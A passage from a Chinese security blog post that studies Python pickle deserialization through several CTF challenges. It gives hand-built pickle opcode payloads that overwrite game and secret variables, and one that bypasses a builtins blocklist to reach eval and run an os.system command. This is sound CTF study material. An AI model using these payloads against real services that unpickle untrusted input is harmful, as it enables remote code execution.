class="hljs-keyword">and</span> self.number == other.number:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment">#要求number属性一定要是int</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(self.number) == <span class="hljs-built_in">int</span><br>        <span class="hljs-comment">#且number再范围内</span><br>        <span class="hljs-keyword">if</span> number_range &gt;= self.number &gt;= <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure>


<p>server</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> game.finished():<br>        length = stdin_read(<span class="hljs-number">4</span>)<br>        length, = read_length(length)<br>        <span class="hljs-comment">#读取长度</span><br>        ticket = stdin_read(length)<br>        <span class="hljs-comment">#按照长度读取序列化后的ticket数据</span><br>        ticket = restricted_loads(ticket)<br>        <span class="hljs-comment">#反序列化</span><br><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(ticket) == Ticket<br>        <span class="hljs-comment">#判断反序列化后的ticket是不是ticket对象</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ticket.is_valid():<br>            <span class="hljs-comment">#is_valid判断</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;The number is invalid.&#x27;</span>)<br>            game.next_game(Ticket(-<span class="hljs-number">1</span>))<br>            <span class="hljs-keyword">continue</span><br>    <br>        win = game.next_game(ticket)<br>        <span class="hljs-keyword">if</span> win:<br>            text = <span class="hljs-string">&quot;Congratulations, you get the right number!&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            text = <span class="hljs-string">&quot;Wrong number, better luck next time.&quot;</span><br>        <span class="hljs-built_in">print</span>(text)<br><br>    <span class="hljs-keyword">if</span> game.is_win():<br>        text = <span class="hljs-string">&quot;Game over! You win all the rounds, here is your flag %s&quot;</span> % get_flag()<br>    <span class="hljs-keyword">else</span>:<br>        text = <span class="hljs-string">&quot;Game over! You got %d/%d.&quot;</span> % (game.win_count, game.round_count)<br>    <span class="hljs-built_in">print</span>(text)<br><br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Houston, we got a problem.&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>看下game类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Game</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment">#number是随机整数</span><br>        number = randint(<span class="hljs-number">0</span>, number_range)<br>        <span class="hljs-comment">#封装到一个ticket对象中，然后初始化round值</span><br>        self.curr_ticket = Ticket(number)<br>        self.round_count = <span class="hljs-number">0</span><br>        self.win_count = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next_game</span>(<span class="hljs-params">self, ticket</span>):<br>        <span class="hljs-comment">#一把判断</span><br>        win = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">if</span> self.curr_ticket == ticket:<br>            <span class="hljs-comment">#比较两个ticket</span><br>            self.win_count += <span class="hljs-number">1</span><br>            win = <span class="hljs-literal">True</span><br><br>        number = randint(<span class="hljs-number">0</span>, number_range)<br>        <span class="hljs-comment">#重新生成随机数</span><br>        self.curr_ticket = Ticket(number)<br>        self.round_count += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">return</span> win<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">finished</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment">#大于等于10次的时候结束</span><br>        <span class="hljs-keyword">return</span> self.round_count &gt;= max_round<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_win</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment">#赢得轮数等于10次的时候结束</span><br>        <span class="hljs-keyword">return</span> self.win_count == max_round<br><br></code></pre></td></tr></table></figure>


<p>游戏的逻辑很简单，一共10轮猜数字得都赢才能拿到flag</p>
<p>我想到的思路：</p>
<p>1.控制传过去的数和要比较的数相等，因为game类实例化是在反序列化之前所以有可能可以控制</p>
<p>2.变更游戏获胜条件，这点可以用反序列化变更全局属性达到</p>
<p>3.有没有办法导入其他库直接读取flag</p>
<h3 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">exp = <span class="hljs-string">b&#x27;&#x27;&#x27;cguess_game</span><br><span class="hljs-string">game</span><br><span class="hljs-string">&#125;S&quot;win_count&quot;</span><br><span class="hljs-string">I10</span><br><span class="hljs-string">sS&quot;round_count&quot;</span><br><span class="hljs-string">I9</span><br><span class="hljs-string">sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\xffsb.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>1-2行获取到game这个类</p>
<p>3-6行修改属性</p>
<p>7用s输入键值对，c获取到类，b修改属性，栈顶传入ticket对象，因为他服务端要判断是否传入ticket对象</p>
<blockquote>
<p>构造出 pickle 代码获得 guess_game.game, 然后修改 game 的 win_count 和 round_count 即可.<br />注意这里必须手写, 如果是 <code>from guess_game import game</code>, 然后修改再 dumps 这个 game 的话, 是在运行时重新新建一个 Game 对象, 而不是从 guess_game 这个 module 里面获取.</p>
</blockquote>
<p>因为他这里限制了只能用它自己的模块，所以只能用字节码来打</p>
<h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>构造恶意类覆盖</p>
<p>RestrictedUnpickler.py 里重写了 find_class，对反序列化的对象位置进行了限制，只允许 guess_game 下的模块，而且不允许含 __ 的内置对象。</p>
<p>那么可以先反序列化一个 guess_game里的game对象，然后再反序列化一个 guess_game.Ticket里的Ticket类，参数 number 随便赋一个值（比如6），然后将 Ticket 赋值给 game的curr_ticket <strong>覆盖服务端随机生成的 Ticket</strong>，最后我们再反序列化一次最开始反序列化的 Ticket，参数 number 赋相同值。</p>
<p>将以上反序列化过程，对照 pickle 源代码构造好一条语句，直接循环10次打过去，就能拿到flag。</p>
<p>构造好的 payload：</p>
<p>ticket &#x3D; b”\x80\x04cguess_game\ngame\nN(S’curr_ticket’\ncguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sbd\x86bcguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.”</p>
<h3 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h3><p>如果用pker里官方带的示例构造极为简单：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">Game = GLOBAL(<span class="hljs-string">&#x27;guess_game.Game&#x27;</span>, <span class="hljs-string">&#x27;Game&#x27;</span>)<br>game = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br>game.round_count = <span class="hljs-number">10</span><br>game.win_count = <span class="hljs-number">10</span><br>ticket = INST(<span class="hljs-string">&#x27;guess_game.Ticket&#x27;</span>, <span class="hljs-string">&#x27;Ticket&#x27;</span>, <span class="hljs-number">6</span>)<br><span class="hljs-keyword">return</span> ticket<br><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">ticket = INST(<span class="hljs-string">&#x27;guess_game.Ticket&#x27;</span>, <span class="hljs-string">&#x27;Ticket&#x27;</span>, <span class="hljs-number">0</span>)<br>game = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br>game.curr_ticket = ticket<br><span class="hljs-keyword">return</span> ticket<br><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">ticket=INST(<span class="hljs-string">&#x27;guess_game.Ticket&#x27;</span>,<span class="hljs-string">&#x27;Ticket&#x27;</span>,(<span class="hljs-number">1</span>))<br>game=GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>,<span class="hljs-string">&#x27;game&#x27;</span>)<br>game.win_count=<span class="hljs-number">9</span><br>game.round_count=<span class="hljs-number">9</span><br>game.curr_ticket=ticket<br><br><span class="hljs-keyword">return</span> ticket<br></code></pre></td></tr></table></figure>

<h2 id="高校战“疫”-webtmp"><a href="#高校战“疫”-webtmp" class="headerlink" title="[高校战“疫”]webtmp"></a>[高校战“疫”]webtmp</h2><blockquote>
<p>变量覆盖</p>
<p>过滤了R，限制模块为__main__</p>
</blockquote>
<p>部分源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, category</span>):<br>        self.name = name<br>        self.category = category<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;Animal(name=<span class="hljs-subst">&#123;self.name&#125;</span>, category=<span class="hljs-subst">&#123;self.category&#125;</span>)&#x27;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">type</span>(other) <span class="hljs-keyword">is</span> Animal <span class="hljs-keyword">and</span> self.name == other.name <span class="hljs-keyword">and</span> self.category == other.category<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-built_in">print</span>(name)<br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	    <span class="hljs-comment">#限制模块</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[<span class="hljs-string">&#x27;__main__&#x27;</span>], name)<br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">filename, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span></span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=encoding) <span class="hljs-keyword">as</span> fin:<br>        <span class="hljs-keyword">return</span> fin.read()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;source&#x27;</span>):<br>        <span class="hljs-keyword">return</span> Response(read(__file__), mimetype=<span class="hljs-string">&#x27;text/plain&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            pickle_data = request.form.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> base64.b64decode(pickle_data):<br>		<span class="hljs-comment">#过滤R</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No... I don\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                result = restricted_loads(base64.b64decode(pickle_data))<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(result) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> Animal:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Are you sure that is an animal???&#x27;</span><br>            correct = (result == Animal(secret.name, secret.category))<br>	    <span class="hljs-comment">#判断</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;result=&#123;&#125;\npickle_data=&#123;&#125;\ngiveflag=&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(result, pickle_data, correct)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(e))<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Something wrong&quot;</span><br><br></code></pre></td></tr></table></figure>

<p>覆盖main下的secret，覆盖原来import的secret</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&quot;1&quot;</span><br><span class="hljs-string">S&quot;category&quot;</span><br><span class="hljs-string">S&quot;2&quot;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>c先引入__main__.sercret,在栈中第一个元素位置.</p>
<p>(压入mark.</p>
<p>S依次压入name,1,category,2</p>
<p>d组成字典{‘name’:’1’,category’:2},且mark,name,1,category,2出栈,字典入栈.</p>
<p>b 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 . 在这里就是操作secret.name和secret.category.(栈上第一个元素出栈</p>
<p>构造Animal对象：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;(c__main__</span><br><span class="hljs-string">Animal</span><br><span class="hljs-string">S&quot;1&quot;</span><br><span class="hljs-string">S&quot;2&quot;</span><br><span class="hljs-string">o.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<p>然后两个拼接即可. 因为要将Animal对象返回,所以赋值留下的一个<strong>元素需要pop掉(0)</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>data=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&quot;1&quot;</span><br><span class="hljs-string">S&quot;category&quot;</span><br><span class="hljs-string">S&quot;2&quot;</span><br><span class="hljs-string">db0(c__main__</span><br><span class="hljs-string">Animal</span><br><span class="hljs-string">S&quot;1&quot;</span><br><span class="hljs-string">S&quot;2&quot;</span><br><span class="hljs-string">o.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(base64.b64encode(data))<br><span class="hljs-comment">#b&#x27;Y19fbWFpbl9fCnNlY3JldAooUyduYW1lJwpTIjEiClMiY2F0ZWdvcnkiClMiMiIKZGIwKGNfX21haW5fXwpBbmltYWwKUyIxIgpTIjIiCm8uCg==&#x27;</span><br></code></pre></td></tr></table></figure>

<h2 id="Code-Breaking-picklecode"><a href="#Code-Breaking-picklecode" class="headerlink" title="Code Breaking picklecode"></a>Code Breaking picklecode</h2><p>题目将pickle能够引入的模块限定为<code>builtins</code>，并且设置了子模块黑名单：<code>&#123;&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;&#125;</code>，于是我们能够<strong>直接</strong>利用的模块有：</p>
<ul>
<li><code>builtins</code>模块中，黑名单外的子模块。</li>
<li>已经<code>import</code>的模块：<code>io</code>、<code>builtins</code>（需要先利用<code>builtins</code>模块中的函数）</li>
</ul>
<p>黑名单中没有<code>getattr</code>，所以可以通过<code>getattr</code>获取<code>io</code>或<code>builtins</code>的子模块以及子模块的子模块:)，而<code>builtins</code>里有<code>eval、exec</code>等危险函数，即使在黑名单中，也可以通过<code>getattr</code>获得。pickle不能直接获取<code>builtins</code>一级模块，但可以通过<code>builtins.globals()</code>获得<code>builtins</code>；这样就可以执行任意代码了。payload为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tRp1</span><br><span class="hljs-string">cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)Rp2</span><br><span class="hljs-string">00g1</span><br><span class="hljs-string">(g2</span><br><span class="hljs-string">S&#x27;builtins&#x27;</span><br><span class="hljs-string">tRp3</span><br><span class="hljs-string">0g0</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&#x27;eval&#x27;</span><br><span class="hljs-string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<p>pker写的话就很简单：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">getattr</span>=GLOBAL(<span class="hljs-string">&#x27;builtins&#x27;</span>,<span class="hljs-string">&#x27;getattr&#x27;</span>)<br><span class="hljs-built_in">dict</span>=GLOBAL(<span class="hljs-string">&#x27;builtins&#x27;</span>,<span class="hljs-string">&#x27;dict&#x27;</span>)<br>dict_get=<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">dict</span>,<span class="hljs-string">&#x27;get&#x27;</span>)<br>glo_dic=GLOBAL(<span class="hljs-string">&#x27;builtins&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>)()<br>builtins=dict_get(glo_dic,<span class="hljs-string">&#x27;builtins&#x27;</span>)<br><span class="hljs-built_in">eval</span>=<span class="hljs-built_in">getattr</span>(builtins,<span class="hljs-string">&#x27;eval&#x27;</span>)<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;print(&quot;123&quot;)&#x27;</span>)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure>

<p>拿到builtins里的方法然后命令执行</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://x5tar.com/posts/python-pickle-unserialize">https://x5tar.com/posts/python-pickle-unserialize</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p>

              
            </div>
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/pythonSec/" class="category-chain-item">pythonSec</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#python反序列化</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>pickle反序列化学习</div>
      <div>https://xianbeil.github.io/2022/02/22/pickle/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年2月22日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/03/03/myjavastudy001/" title="【基础】-JAVAWEB基础知识">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">【基础】-JAVAWEB基础知识</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/02/21/hello/" title="hello">
                        <span class="hidden-mobile">hello</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>






  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script>
  (function() {
    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
    var enableCopy = CONFIG.copy_btn;
    if (!enableLang && !enableCopy) {
      return;
    }

    function getBgClass(ele) {
      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
    }

